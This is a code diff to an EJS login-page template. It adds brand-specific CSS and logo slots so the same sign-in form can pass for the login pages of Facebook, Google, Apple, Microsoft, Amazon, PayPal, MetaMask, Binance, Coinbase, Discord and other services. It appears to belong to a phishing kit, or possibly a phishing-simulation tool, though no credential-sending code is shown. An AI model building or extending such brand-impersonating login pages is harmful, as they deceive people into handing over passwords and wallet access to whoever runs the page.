@@ -37,6 +37,7 @@
     margin:0 auto 22px;
     box-shadow:0 8px 24px rgba(0,0,0,.3);
   }
+  .logo svg, .logo-svg { display:block; margin:0 auto 22px; }
   h1 { font-size:1.35rem; text-align:center; margin-bottom:6px; font-weight:800; }
   .sub { text-align:center; font-size:.9rem; opacity:.65; margin-bottom:28px; }
   form { display:grid; gap:13px; }
@@ -58,11 +59,144 @@
   }
   button:hover { transform:translateY(-2px); filter:brightness(1.08); }
   button:active { transform:translateY(0); }
+
+  /* ── Brand overrides ── */
+  body.brand-facebook { background:#f0f2f5; color:#1c1e21; }
+  body.brand-facebook .auth { background:#fff; border:none; box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 24px rgba(0,0,0,.06); border-radius:8px; }
+  body.brand-facebook h1 { color:#1c1e21; }
+  body.brand-facebook .sub { color:#606770; opacity:1; }
+  body.brand-facebook input { background:#fff; border:1px solid #dddfe2; border-radius:6px; color:#1c1e21; }
+  body.brand-facebook input::placeholder { color:#90949c; opacity:1; }
+  body.brand-facebook input:focus { border-color:#1877F2; box-shadow:0 0 0 2px rgba(24,119,242,.2); background:#fff; }
+  body.brand-facebook button { background:#1877F2; border-radius:6px; background-image:none; font-weight:700; letter-spacing:.3px; }
+  body.brand-facebook button:hover { background:#166fe5; transform:none; filter:none; }
+
+  body.brand-google, body.brand-gmail { background:#fff; color:#202124; }
+  body.brand-google .auth, body.brand-gmail .auth { background:#fff; border:1px solid #dadce0; border-radius:8px; box-shadow:none; }
+  body.brand-google h1, body.brand-gmail h1 { color:#202124; font-weight:400; font-size:1.5rem; }
+  body.brand-google .sub, body.brand-gmail .sub { color:#5f6368; opacity:1; }
+  body.brand-google input, body.brand-gmail input { background:#fff; border:1px solid #dadce0; border-radius:4px; color:#202124; }
+  body.brand-google input:focus, body.brand-gmail input:focus { border-color:#1a73e8; background:#fff; box-shadow:0 0 0 2px rgba(26,115,232,.2); }
+  body.brand-google button, body.brand-gmail button { background:#1a73e8; border-radius:4px; background-image:none; font-weight:500; }
+  body.brand-google button:hover, body.brand-gmail button:hover { background:#1765cc; transform:none; filter:none; }
+
+  body.brand-apple { background:#f5f5f7; color:#1d1d1f; }
+  body.brand-apple .auth { background:#fff; border:none; box-shadow:0 4px 16px rgba(0,0,0,.12); border-radius:18px; }
+  body.brand-apple h1 { color:#1d1d1f; font-weight:600; }
+  body.brand-apple .sub { color:#6e6e73; opacity:1; }
+  body.brand-apple input { background:#f5f5f7; border:1px solid #d2d2d7; border-radius:10px; color:#1d1d1f; }
+  body.brand-apple input:focus { border-color:#0071e3; background:#fff; box-shadow:none; }
+  body.brand-apple button { background:#0071e3; border-radius:980px; background-image:none; font-weight:400; }
+  body.brand-apple button:hover { background:#0077ed; transform:none; filter:none; }
+
+  body.brand-microsoft { background:#fff; color:#323130; font-family:'Segoe UI',system-ui; }
+  body.brand-microsoft .auth { background:#fff; border:none; box-shadow:none; border-radius:0; max-width:440px; }
+  body.brand-microsoft h1 { color:#323130; font-weight:600; font-family:'Segoe UI',sans-serif; }
+  body.brand-microsoft input { background:#fff; border:1px solid #605e5c; border-radius:2px; color:#323130; }
+  body.brand-microsoft input:focus { border-color:#0067b8; border-width:2px; background:#fff; box-shadow:none; }
+  body.brand-microsoft button { background:#0067b8; border-radius:2px; background-image:none; font-weight:600; }
+  body.brand-microsoft button:hover { background:#005a9e; transform:none; filter:none; }
+
+  body.brand-amazon { background:#fff; color:#0f1111; }
+  body.brand-amazon .auth { background:#fff; border:1px solid #a6a6a6; border-radius:4px; box-shadow:none; max-width:350px; padding:24px; }
+  body.brand-amazon h1 { color:#0f1111; font-size:1.1rem; font-weight:700; }
+  body.brand-amazon input { background:#fff; border:1px solid #a6a6a6; border-radius:3px; color:#0f1111; }
+  body.brand-amazon input:focus { border-color:#e77600; box-shadow:0 0 0 3px rgba(228,121,17,.5); background:#fff; }
+  body.brand-amazon button { background:linear-gradient(to bottom,#f7dfa5,#f0c14b); color:#111; border:1px solid #a88734; border-radius:3px; background-image:none; background:linear-gradient(to bottom,#f7dfa5,#f0c14b); font-weight:normal; }
+  body.brand-amazon button:hover { background:linear-gradient(to bottom,#f5d78e,#eeb933); transform:none; filter:none; }
+
+  body.brand-netflix { background:#000; color:#fff; }
+  body.brand-netflix .auth { background:#141414; border:none; box-shadow:none; border-radius:4px; }
+  body.brand-netflix h1 { color:#fff; font-size:2rem; }
+  body.brand-netflix input { background:#333; border:none; border-radius:4px; color:#fff; }
+  body.brand-netflix input:focus { background:#454545; border:none; box-shadow:none; }
+  body.brand-netflix button { background:#e50914; border-radius:4px; background-image:none; font-size:1rem; font-weight:700; }
+  body.brand-netflix button:hover { background:#f40612; transform:none; filter:none; }
+
+  body.brand-instagram { background:#fafafa; color:#262626; }
+  body.brand-instagram .auth { background:#fff; border:1px solid #dbdbdb; border-radius:1px; box-shadow:none; }
+  body.brand-instagram h1 { color:#262626; }
+  body.brand-instagram input { background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; color:#262626; font-size:.875rem; }
+  body.brand-instagram input:focus { border-color:#a8a8a8; background:#fafafa; box-shadow:none; }
+  body.brand-instagram button { background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); border-radius:4px; background-image:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); font-weight:600; }
+
+  body.brand-twitter,body.brand-twitterx { background:#fff; color:#0f1419; }
+  body.brand-twitter .auth,body.brand-twitterx .auth { background:#fff; border:none; box-shadow:none; border-radius:16px; }
+  body.brand-twitter input,body.brand-twitterx input { background:#fff; border:1px solid #cfd9de; border-radius:4px; color:#0f1419; }
+  body.brand-twitter input:focus,body.brand-twitterx input:focus { border-color:#1d9bf0; background:#fff; box-shadow:0 0 0 2px rgba(29,155,240,.25); }
+  body.brand-twitter button,body.brand-twitterx button { background:#0f1419; border-radius:9999px; background-image:none; font-weight:700; }
+
+  body.brand-paypal { background:#0070ba; color:#fff; }
+  body.brand-paypal .auth { background:#fff; color:#2c2e2f; border-radius:6px; border:none; box-shadow:0 0 0 1px #b7bcbf; }
+  body.brand-paypal h1 { color:#2c2e2f; }
+  body.brand-paypal .sub { color:#6c7378; opacity:1; }
+  body.brand-paypal input { background:#fff; border:1px solid #9da3a6; border-radius:4px; color:#2c2e2f; }
+  body.brand-paypal input:focus { border-color:#009cde; box-shadow:0 0 0 2px rgba(0,156,222,.3); background:#fff; }
+  body.brand-paypal button { background:#0070ba; border-radius:25px; background-image:none; font-weight:700; }
+  body.brand-paypal button:hover { background:#005ea6; transform:none; filter:none; }
+
+  body.brand-metamask { background:#24272A; color:#fff; }
+  body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; border-radius:12px; }
+  body.brand-metamask button { background:#F6851B; border-radius:8px; background-image:none; }
+  body.brand-metamask button:hover { background:#e2761b; transform:none; filter:none; }
+
+  body.brand-binance { background:#181A20; color:#eaecef; }
+  body.brand-binance .auth { background:#1e2026; border:1px solid #2e3340; border-radius:8px; }
+  body.brand-binance input { background:#2b2f36; border:1px solid #474d57; color:#eaecef; }
+  body.brand-binance input:focus { border-color:#F0B90B; background:#2b2f36; box-shadow:none; }
+  body.brand-binance button { background:#F0B90B; color:#1a1a1a; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-binance button:hover { background:#f8d33a; transform:none; filter:none; }
+
+  body.brand-coinbase { background:#fff; color:#0a0b0d; }
+  body.brand-coinbase .auth { background:#fff; border:1px solid #e9eaeb; border-radius:16px; }
+  body.brand-coinbase input { background:#f5f5f5; border:1px solid #e9eaeb; border-radius:8px; color:#0a0b0d; }
+  body.brand-coinbase input:focus { border-color:#0052FF; box-shadow:0 0 0 2px rgba(0,82,255,.2); background:#fff; }
+  body.brand-coinbase button { background:#0052FF; border-radius:8px; background-image:none; font-weight:600; }
+
+  body.brand-discord { background:#5865F2; color:#fff; }
+  body.brand-discord .auth { background:#36393f; border:none; border-radius:5px; }
+  body.brand-discord h1 { color:#fff; }
+  body.brand-discord .sub { color:#b9bbbe; opacity:1; }
+  body.brand-discord input { background:#40444b; border:none; border-radius:3px; color:#dcddde; }
+  body.brand-discord input:focus { border:none; box-shadow:0 0 0 2px #5865F2; background:#40444b; }
+  body.brand-discord button { background:#5865F2; border-radius:3px; background-image:none; font-weight:500; }
+
+  body.brand-linkedin { background:#f3f2ef; color:#000; }
+  body.brand-linkedin .auth { background:#fff; border:none; border-radius:8px; box-shadow:0 0 0 1px rgba(0,0,0,.15); }
+  body.brand-linkedin h1 { color:#000; font-weight:400; font-size:2rem; }
+  body.brand-linkedin input { background:#fff; border:1px solid rgba(0,0,0,.6); border-radius:4px; color:#000; }
+  body.brand-linkedin input:focus { border-color:#0a66c2; border-width:2px; background:#fff; box-shadow:none; }
+  body.brand-linkedin button { background:#0a66c2; border-radius:28px; background-image:none; font-weight:600; }
+
+  body.brand-snapchat { background:#FFFC00; color:#000; }
+  body.brand-snapchat .auth { background:#fff; border:none; border-radius:32px; box-shadow:0 4px 20px rgba(0,0,0,.15); }
+  body.brand-snapchat h1 { color:#000; }
+  body.brand-snapchat input { background:#f5f5f5; border:1.5px solid #e0e0e0; border-radius:8px; color:#000; }
+  body.brand-snapchat input:focus { border-color:#FFFC00; background:#fff; box-shadow:none; }
+  body.brand-snapchat button { background:#FFFC00; color:#000; border-radius:100px; background-image:none; font-weight:700; }
+  body.brand-snapchat button:hover { background:#ffe800; transform:none; filter:none; }
+
+  body.brand-tiktok { background:#000; color:#fff; }
+  body.brand-tiktok .auth { background:#161823; border:1px solid #2e3340; border-radius:0; }
+  body.brand-tiktok input { background:#2b2f36; border:1px solid #3c4044; color:#fff; }
+  body.brand-tiktok input:focus { border-color:#fe2c55; background:#2b2f36; box-shadow:none; }
+  body.brand-tiktok button { background:#fe2c55; border-radius:2px; background-image:none; font-weight:700; }
+
+  body.brand-spotify { background:#191414; color:#fff; }
+  body.brand-spotify .auth { background:#191414; border:none; box-shadow:none; }
+  body.brand-spotify input { background:#3e3e3e; border:none; border-radius:4px; color:#fff; }
+  body.brand-spotify input:focus { border:none; box-shadow:0 0 0 3px #1DB954; background:#3e3e3e; }
+  body.brand-spotify button { background:#1DB954; color:#000; border-radius:50px; background-image:none; font-weight:700; letter-spacing:2px; }
+  body.brand-spotify button:hover { background:#1fce5e; transform:none; filter:none; }
 </style>
 </head>
-<body>
+<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
 <div class="auth">
-  <div class="logo"><%= tpl.name.charAt(0).toUpperCase() %></div>
+  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %>
+    <div class="logo-svg"><%- logos[tpl.key] %></div>
+  <% } else { %>
+    <div class="logo"><%= tpl.name.charAt(0).toUpperCase() %></div>
+  <% } %>
   <h1><%= pageContent.headline %></h1>
   <% if (pageContent.subheadline) { %><p class="sub"><%= pageContent.subheadline %></p><% } %>
 
